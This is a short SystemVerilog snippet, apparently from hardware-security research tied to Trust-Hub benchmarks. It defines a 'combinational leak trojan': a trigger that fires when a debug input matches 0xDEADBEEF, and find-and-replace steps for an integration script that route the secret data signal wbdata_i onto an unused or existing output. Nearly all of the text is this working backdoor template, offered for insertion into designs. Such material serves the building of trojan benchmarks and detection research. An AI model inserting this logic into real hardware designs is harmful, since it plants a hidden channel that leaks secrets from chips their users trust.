/**
 * Combinational Leak Trojan - Code Snippet
 * 
 * Trust-Hub Category: Leak Information ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T600, AES-T1400, AES-T800
 * 
 * Description:
 *   Leaks sensitive data when trigger condition met
 *   
 * Trigger: Pattern match on debug_mode_i
 * Payload: Route wbdata_i to output
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Condition-based)
// ============================================================

// Trigger pattern (e.g., debug mode enabled)
localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

wire trojan_active;
assign trojan_active = (debug_mode_i == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Information Leak: Route wbdata_i to observable output
//
// Integration Script Must:
// 1. Find unused output or low-order bit of existing output
// 2. Modify to leak secret data when trojan_active
//
// Example modification:
//   Find: assign unused_output = 1'b0;
//   Replace: assign unused_output = trojan_active ? wbdata_i[0] : 1'b0;
//
// OR modify existing output:
//   Find: assign some_output = normal_data;
//   Replace: assign some_output = trojan_active ? wbdata_i : normal_data;